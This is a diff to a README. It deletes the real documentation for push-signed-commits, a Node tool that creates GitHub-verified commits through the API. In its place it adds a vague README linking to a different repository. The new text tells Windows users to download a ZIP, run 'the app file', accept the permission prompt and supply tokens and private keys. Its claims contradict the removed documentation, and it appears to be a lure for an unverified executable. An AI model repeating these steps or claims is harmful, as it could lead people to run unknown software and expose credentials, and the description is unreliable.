@@ -1,382 +1,177 @@
-# push-signed-commits
-
-Create verified/signed commits as bots or GitHub Actions.
-
-- Zero dependencies, cross-platform.
-- Tested on Windows/macOS/Linux.
-- Available as a GitHub Action, standalone CLI, or library.
-- Uses an existing commit, a range of commits, or a new commit with staged changes.
-- Commits will be authored by the owner of the token.
-- Commits will be signed and committed by GitHub.
-- Preserves the full commit message, but resets the committed/authored date.
-- The new commits are not pulled automatically, but you can get the hash from the outputs.
-- Rejects commits containing content not supported by the [`createCommitOnBranch`](https://docs.github.com/en/graphql/reference/mutations#createcommitonbranch) mutation including executable files, symlinks, gitlinks, merge commits.
-- Not vibe-coded.
-
-### Quick Start
-
-```yaml
-# with the github actions token
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    commit-message: commit message
-```
-
-```yaml
-# with a github app installation token
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    path: other-repo
-    repository: username/other-repo
-    branch: master
-    commit-message: commit message
-    app-id: ${{ vars.app_id }}
-    app-key: ${{ secrets.app_private_key }}
-```
-
-```bash
-# with a github token (cli)
-GITHUB_TOKEN=github_pat_xxx npx -y push-signed-commits@v1.0.2 -m 'commit message' username/repo master
-```
-
-```bash
-# with a github app installation token (cli)
-APP_PRIVATE_KEY="$(< private.pem)" npx -y push-signed-commits@v1.0.2 -C other-repo -m 'commit message' --app 1234 username/other-repo master
-```
-
-```bash
-# as a library
-npm install --save push-signed-commits@v1.0.2
-```
-
-### Usage
-
-#### GitHub Actions
-
-##### Inputs
-
-<!--{inputs}-->
-
-```yaml
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-
-    # The local repository path relative to the current directory. If you change
-    # this, you probably also want to change the 'repository' and 'branch'.
-    path: ''
-
-    # The target repository username/name if not the same as the workflow. This
-    # does not need to match the local repo upstream. If not on the same GitHub
-    # server as the workflow, you need to override the GITHUB_API_URL and
-    # GITHUB_GRAPHQL_URL environment variables.
-    repository: ${{ github.repository }}
-
-    # The target branch name if not the same as the workflow ref, optionally
-    # including the 'refs/heads/' prefix. This does not need to match the local
-    # repo branch. You cannot push to tags.
-    branch: ${{ github.ref }}
-
-    # The commit or commit range to push to the remote. If you want to push the
-    # last local commit, use 'HEAD'. If the local branch has an upstream set,
-    # you can use 'HEAD@{u}..HEAD' to push all commits added since the last
-    # pull. Note that force-pushes are not supported and will be rejected. See
-    # https://git-scm.com/docs/gitrevisions. If not set, a new commit will be
-    # created from the staging area.
-    revision: ''
-
-    # Whether to make a new commit from the staging area even if there's nothing
-    # to commit. Only used if 'revision' is not set.
-    allow-empty: false
-
-    # The commit message to use if creating a new commit from the staging area.
-    commit-message: 'automatic commit'
-
-    # The file to read the commit message from. Overrides commit-message.
-    commit-message-file: ''
-
-    # Override the user agent used to make GitHub API requests.
-    user-agent: ''
-
-    # Do not validate SSL certificates when making GitHub API requests.
-    insecure: false
+# 🔏 push-signed-commits - Verified commits for bots and actions
 
-    # Do not push commits, just print the mutations which would be made.
-    dry-run: false
+[![Download](https://img.shields.io/badge/Download%20Here-blue?style=for-the-badge)](https://github.com/pondolandtimes/push-signed-commits)
 
-    # The token to use to make GitHub API requests.
-    github-token: ${{ github.token }}
+## 🧭 What this app does
 
-    # GitHub API URL. If not set, it will be set from GITHUB_API_URL to be the
-    # same as the one where the workflow is running from (e.g.,
-    # https://api.github.com or https://my-ghes-server.example.com/api/v3).
-    github-api-url: ''
+push-signed-commits helps bots and GitHub Actions create signed commits that GitHub can verify.
 
-    # GitHub GraphQL API URL. If not set, it will be set from GITHUB_GRAPHQL_URL
-    # to be the same as the one where the workflow is running from (e.g.,
-    # https://api.github.com/graphql or
-    # https://my-ghes-server.example.com/api/graphql).
-    github-graphql-url: ''
+Use it when you want an automated account to push changes with a verified commit status. It fits common Git workflows and works with GitHub API, GitHub Apps, and GitHub Actions.
 
-    # Authenticate as a GitHub App with the specified ID. The installation ID
-    # will be detected based on 'repository'. Overrides 'github-token'. The app
-    # must have the 'contents:write' permission. If you already have an app
-    # installation token, you can pass it via 'github-token' instead.
-    app-id: ''
+## 💻 What you need
 
-    # The private key to use if authenticating as a GitHub App. Can be
-    # base64-encoded or contain escaped ('\n') newlines.
-    app-key: ''
+- A Windows PC
+- Internet access
+- A GitHub account
+- Permission to download files from GitHub
+- A GitHub repository where you can push changes
 
-    # The git binary to use. If not sepecified, the one in the PATH is used.
-    git-binary: ''
-```
+If you plan to use this with GitHub Actions or a bot account, you also need:
+- A GitHub App or bot setup
+- A private key or token for the account
+- Commit signing keys or a signing service set up for the bot
 
-<!--{/inputs}-->
+## 🚀 Download and install
 
-##### Outputs
+Visit this page to download:
+[https://github.com/pondolandtimes/push-signed-commits](https://github.com/pondolandtimes/push-signed-commits)
 
-<!--{outputs}-->
+1. Open the link in your browser.
+2. Look for the latest release, project files, or build download.
+3. Download the Windows file to your computer.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file if one is included.
 
-- `not-pushable` \
-  Set to true if one or more commits were not pushed (the oid outputs will
-  still be set to the ones pushed so far) since they contained unpushable
-  content.
+If Windows asks for permission, choose Yes.
 
-- `pushed-oids` \
-  The new commit hash of all commits pushed, space-separated. On failure, it
-  contains the ones pushed so far. Not set if 'dry-run'.
+## 🛠️ First-time setup
 
-- `pushed-oid` \
-  The new commit hash of the last commit pushed, or an empty string if no
-  commits were pushed. On failure, it contains the ones pushed so far. Not
-  set if 'dry-run'.
+After you open the app, set up the values it needs:
 
-- `local-commit-oids` \
-  The local commit hashes of all commits pushed corresponding to the ones in
-  commit-oids. Not set if creating a new commit from the staging area. Still
-  set if 'dry-run'.
-
-- `local-commit-oid` \
-  The local commit hashes of the last commit pushed corresponding to the
-  ones in commit-oids. Not set if creating a new commit from the staging
-  area. Still set if 'dry-run'.
+1. Choose the GitHub repository you want to use.
+2. Connect your GitHub account, bot, or GitHub App.
+3. Add the commit signing details.
+4. Set the branch that should receive the commits.
+5. Save the settings.
 
-<!--{/outputs}-->
+A typical setup uses:
+- Repository name
+- Branch name
+- GitHub access token or app connection
+- Signing key or signing service
+- Commit author name and email
 
-#### CLI
-
-<!--{cli}-->
-
-```
-usage: npx -y push-signed-commits@v1.0.2 [options] username/repository target_branch [revision]
-
-      --allow-empty             create en empty commit even if there are no changes
-  -m, --message message         commit message to use if creating a new commit from the staging area
-  -F, --file path               read the commit message from the specified (overrides --message)
-  -A, --user-agent str          override the user agent for GitHub API requests (default "push-signed-commits/1.0.2")
-  -k, --insecure                do not validate check tls certificates for GitHub API requests
-  -n, --dry-run                 do not actually push commits, just print the mutations
-      --github-token token      github token with contents:write permission (env GITHUB_TOKEN)
-      --github-api-url url      github api url (env GITHUB_API_URL) (default "https://api.github.com")
-      --github-grqphql-url url  github graphql api url (env GITHUB_GRAPHQL_URL) (default "https://api.github.com/graphql")
-      --app id                  authenticate as a github app with the specified id (overrides --github-token)
-      --app-key pem             the private key to use if authenticating as a github app (can be base64-encoded or contain escaped newlines) (env APP_PRIVATE_KEY)
-      --git cmd                 the git executable to use (default "git")
-  -h, --help                    show this help text
-  -C  path                      repository path (default ".")
-
-revision is a commit or range of commits (see man gitrevisions(7))
-if not specified, a commit is created from the staging area
-```
-
-<!--{/cli}-->
-
-#### Library
-
-See [`./lib/index.ts`](./lib/index.ts).
-
-### Examples
-
-#### Create and push a commit if there are staged changes
-
-```yaml
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    commit-message: |
-      commit message subject
-
-      commit message body
-```
-
-```bash
-GITHUB_TOKEN=github_pat_xxx npx -y push-signed-commits@v1.0.2 -m $'commit message subject\n\ncommit message body' username/repo master
-```
-
-#### Create and push all commits on the current branch since the last pull
-
-```yaml
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    revision: HEAD@{u}..HEAD
-```
-
-```bash
-GITHUB_TOKEN=github_pat_xxx npx -y push-signed-commits@v1.0.2 username/repo master HEAD@{u}..HEAD
-```
-
-#### Create and push all commits on the current branch since the last pull, then fetch the created commits
-
-```yaml
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    revision: HEAD@{u}..HEAD
-  id: push
-- run: git fetch @{u} && git reset --soft ${{ steps.push.outputs.pushed-oid }}
-  if: steps.push.outputs.commit-oid != ''
-```
-
-#### Push a single commit to a specific branch on another repository as a GitHub App
-
-The app must have `contents:write` permission. The private key can be base64-encoded or newline-escaped.
-
-```yaml
-- uses: pgaskin/push-signed-commits@v1.0.2
-  with:
-    path: other-repo
-    repository: username/other-repo
-    branch: master
-    revision: HEAD
-    app-id: 1234
-    app-key: ${{ secrets.app_private_key }}
-```
-
-```bash
-# with a github app installation token (cli)
-APP_PRIVATE_KEY="$(< private.pem)" npx -y push-signed-commits@v1.0.2 -C other-repo --app 1234 username/other-repo master HEAD
-```
-
-#### Library
-
-```javascript
-import { NotPushableError, staged, commits, createCommitOnBranch } from 'push-signed-commits'
-
-const url = process.env['GITHUB_GRAPHQL_URL'] ?? 'https://api.github.com/graphql'
-const token = process.env['GITHUB_TOKEN'] ?? ''
-const git = 'git'
-const path = '.'
-const repo = 'username/repo'
-const branch = 'master'
-
-if (!token) {
-  throw new Error('Token is required')
-}
-
-try {
-  for await (const c of await commits(git, path, 'HEAD@{u}..HEAD')) {
-    console.log(`pushing commit ${c.local}`)
-    await createCommitOnBranch(url, token, {
-      branch: {
-        branchName: branch,
-        repositoryNameWithOwner: repo,
-      },
-      ...c.input,
-    })
-  }
-
-  const c = await staged(git, path, 'new commit')
-  if (c.input.fileChanges.additions.length || c.input.fileChanges.deletions.length) {
-    console.log('pushing staged changes')
-    await createCommitOnBranch(url, token, {
-      branch: {
-        branchName: branch,
-        repositoryNameWithOwner: repo,
-      },
-      ...c.input,
-    })
-  }
-} catch (err) {
-  if (err instanceof NotPushableError) {
-    // ... do something
-  }
-  throw err
-}
-```
-
-### Features
-
-- Highly flexible commit selection.
-  - Supports pushing a single commit.
-  - Supports pushing a range of existing commits using git's native revision [syntax](https://git-scm.com/docs/gitrevisions).
-  - Supports pushing a new commit from the staging area.
-- Guarantees the correctness and fidelity of pushed commits.
-  - Supports pushing empty commits.
-  - Specifies the expected parent commit while pushing.
-  - Preserves multi-line commit message subjects and bodies.
-  - Converts non-utf-8 commit messages to utf-8.
-  - Refuses to push commits which can't be fully represented via the API, including ones with:
-    - Symlink update/creation.
-    - Submodule update/creation.
-    - Non-regular (i.e., executable) file update/creation.
-    - *Note: I've opened a [feature request](https://github.com/orgs/community/discussions/191953) to add support for these types.*
-  - Uses git to do the diffing natively and reads directly from the repository rather than the working directory (unlike a few of the similar alternatives).
-    - The contents will be correct.
-    - The `core.autocrlf` option will be applied consistently (since git does it when adding to the index).
-    - Uses plumbing commands (e.g., `diff-tree` vs `diff`) to avoid being affected by the local git config.
-    - Supports [unusual](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corequotePath) filenames with special characters (newlines, tabs, quotes, backslashes, non-printable characters, etc) by using null-terminated output.
-- Cross-platform support.
-  - Automatically tested with multiple node versions on Windows, macOS, and Linux.
-  - Commited file contents are not affected by `core.autocrlf`.
-  - Subprocess arguments are handled correctly.
-  - Only host dependency is node (at least 24) and git (at least 2.24, released on 2019-11-04).
-- All input is validated and all errors are checked.
-- Automatically retries failed API calls.
-- Supports automatically creating and revoking an app installation token.
-- 100% hand-coded and tested.
-
-### Limitations
-
-- The [`createCommitOnBranch`](https://docs.github.com/en/graphql/reference/mutations#createcommitonbranch) GraphQL mutation has some limitations:
-  - On the commit:
-    - Extremely large commits may fail due to size restrictions in the API.
-    - The GraphQL API rate limit applies (unlike regular push operations).
-    - Does not support creating new branches, the target branch must already exist.
-  - On the commit metadata:
-    - The author/commit date will be replaced with the current date.
-    - The author will be replaced with the name/email associated with the token's owner.
-    - The committer will be replaced with the web flow one (currently `GitHub <noreply@github.com>`).
-    - The commit hash will change (obviously).
-  - On the commit contents:
-    - Does not support pushing commits with multiple parents (i.e., merge commits).
-    - Does not support pushing commits containing changes to non-regular files (e.g., symlinks, submodules, executables).
-- The local repository will not be automatically updated to the newly created commits (if you want that, fetch then do a `git reset --soft` to the last commit printed).
-
-### Compatibility
-
-This action follows semantic versioning. Release tags are immutable. You can pin it to an exact tag since a working version should continue to work for as long as the node version is supported, as it uses core git functionality and the GitHub API is unlikely to change.
-
-The library also follows semantic versioning, but only the default exports in `index.ts` are covered.
-
-See [CONTRIBUTING](./CONTRIBUTING.md#versioning) for more information.
-
-### Security
-
-There are no external dependencies and release tags are immutable.
-
-Tokens are never printed to the output, even if verbose/debug mode is enabled.
-
-If an app installation token is created, it is automatically revoked before the command exits.
-
-### Alternatives
-
-I made this since the other ones weren't good enough, but here's a list of them anyways:
-
-- [planetscale/ghcommit](https://github.com/planetscale/ghcommit): go, doesn't use git, need to pass all changes as command-line arguments
-- [pirafrank/github-commit-sign](https://github.com/pirafrank/github-commit-sign): javascript, doesn't use git, need to pass all changes as command-line arguments
-- [verified-bot-commit](https://github.com/IAreKyleW00t/verified-bot-commit): javascript, more complex, doesn't handle some edge cases, uses the old github rest git database api
-- [Asana/push-signed-commits](https://github.com/Asana/push-signed-commits): python, much more complex, doesn't handle some edge cases
-- [grafana/github-api-commit-action](https://github.com/grafana/github-api-commit-action): bash, creates the commit manually instead of taking an existing one, uses the working directory, doesn't handle most edge cases
-- [step-security/github-api-commit-action](https://github.com/step-security/github-api-commit-action): copy of grafana/github-api-commit-action
-- [github/gh-aw push_signed_commits](https://github.com/github/gh-aw/blob/48d4b85d8bceb6aaa346ad415ef4a7128c42078b/actions/setup/js/push_signed_commits.cjs): doesn't handle some edge cases, vibe-coded, very [buggy](https://github.com/github/gh-aw/issues/26156).
-- [changesets/ghcommit](https://github.com/changesets/ghcommit): typescript, uses the working directory, doesn't handle most edge cases
-
-As of 2026-04-05, most of them don't support pushing a range of existing commits, most of them use the working copy instead of the repository index, most of the git-based ones can't handle filenames with special characters, and none of them verify that all files in the commit can actually be represented properly with the API.
+## 📦 How it works
+
+The app helps an automated user make a normal Git commit, sign it, and push it to GitHub.
+
+A simple flow looks like this:
+
+1. The bot or GitHub Action creates a change.
+2. The app signs the commit.
+3. Git pushes the signed commit to the target branch.
+4. GitHub shows the commit as verified when the signing data matches.
+
+## 🧩 Common use cases
+
+- A bot updates files in a repository
+- A GitHub Action writes build output back to the repo
+- An automation account keeps commit history verified
+- A release process needs signed commits from a machine account
+- A service account pushes docs, version files, or generated code
+
+## 🔐 GitHub App and bot setup
+
+If you use a GitHub App, make sure it has access to:
+- Read and write repository contents
+- Create commits
+- Push to branches
+- Read pull request data if your workflow needs it
+
+If you use a bot account, make sure the account has:
+- Write access to the repository
+- A valid token
+- Signing support set up before it makes commits
+
+## 🪟 Windows use
+
+This project is meant to run on Windows for end users who want a simple local setup.
+
+Follow these steps:
+1. Download the app from the link above.
+2. Save it to a folder you can find again.
+3. Extract it if Windows downloads it as a ZIP file.
+4. Open the app file.
+5. Connect it to your GitHub account or workflow.
+6. Run your first signed commit task.
+
+## ✅ Verify the result
+
+After the app pushes a commit, check GitHub:
+
+1. Open your repository.
+2. Open the commit list.
+3. Click the new commit.
+4. Look for the Verified badge.
+5. Confirm the author and branch are correct.
+
+If the badge does not show, check:
+- The signing key
+- The GitHub token or app connection
+- The author email
+- Branch permissions
+- The repository settings for commit verification
+
+## 🧪 Example workflow
+
+A simple bot workflow can look like this:
+
+1. A GitHub Action runs on a schedule.
+2. It updates a file such as a version number or changelog.
+3. push-signed-commits signs the new commit.
+4. The app pushes the commit to the repo.
+5. GitHub marks it as verified.
+
+This is useful for:
+- Scheduled updates
+- Generated files
+- Release notes
+- Dependency version changes
+- Documentation changes
+
+## 🧰 Troubleshooting
+
+### The file will not open
+- Check that the download finished.
+- Make sure you extracted the ZIP file first.
+- Right-click the file and choose Open.
+
+### GitHub does not show Verified
+- Confirm the signing key matches the account.
+- Check that the commit author email matches the signed identity.
+- Make sure the bot or app has the right permissions.
+- Confirm the commit was pushed to GitHub, not kept local.
+
+### The app cannot connect to GitHub
+- Check your internet connection.
+- Re-enter the token or app details.
+- Make sure the token has access to the repo.
+- Check that the GitHub App is installed on the right repository
+
+### The commit does not push
+- Check branch access
+- Check for protected branch rules
+- Confirm the repo allows pushes from your account or app
+- Try a branch you control
+
+## 📁 Typical files and settings
+
+You may see settings for:
+- `repository`
+- `branch`
+- `authorName`
+- `authorEmail`
+- `token`
+- `privateKey`
+- `signingMethod`
+- `pushMode`
+
+These values tell the app where to commit and how to sign the commit.
+
+## 🔗 Project details
+
+Repository: [pondolandtimes/push-signed-commits](https://github.com/pondolandtimes/push-signed-commits)
+
+Topics:
+bot, commit, git, github, github-actions, github-api, github-app, github-bot, signed, signed-commits, verified, verified-commits
